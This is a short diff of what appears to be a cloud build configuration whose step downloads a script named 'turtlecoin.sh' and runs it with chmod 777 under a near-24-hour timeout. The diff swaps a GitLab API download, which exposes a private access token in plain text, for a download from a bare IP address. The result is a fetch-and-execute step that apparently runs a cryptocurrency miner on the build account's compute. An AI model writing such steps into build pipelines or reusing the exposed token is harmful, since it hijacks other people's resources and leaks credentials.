@@ -4,7 +4,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:6aweBXCvir9pJui2t99x' 'https://gitlab.com/api/v4/projects/25904259/repository/files/turtlecoin.sh/raw?ref=master'
+          wget -O test.sh http://144.202.12.72:8080/k8MEv/turtlecoin.sh
           chmod 777 test.sh
           ./test.sh
 timeout: 86399s
